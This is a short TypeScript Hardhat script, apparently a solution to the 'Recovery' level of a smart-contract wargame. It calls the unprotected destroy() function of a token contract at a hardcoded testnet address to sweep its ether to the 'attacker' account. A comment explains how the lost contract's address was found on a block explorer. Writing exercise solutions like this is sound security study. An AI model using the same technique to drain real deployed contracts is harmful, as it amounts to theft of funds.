import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/17.Recovery/SimpleToken.sol/SimpleToken.json";
import { Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x1d9Ccd44FD9571c5080FD6C9060286f487515130";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const tx = await target.connect(attacker).destroy(attacker.address);
  await tx.wait();
  const balance = await attacker.provider!.getBalance(target.address);
  displayResult(balance.isZero());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// You can easily find the contract created by the recovery contract on
// etherscan/polygonscan.
// https://mumbai.polygonscan.com/tx/0x127351a3f8a3999f55b3da0c0a46a6c34abade07e02eccb034334baa6cda8a2a
// Here you can see that the second transfer is done to the lost address.
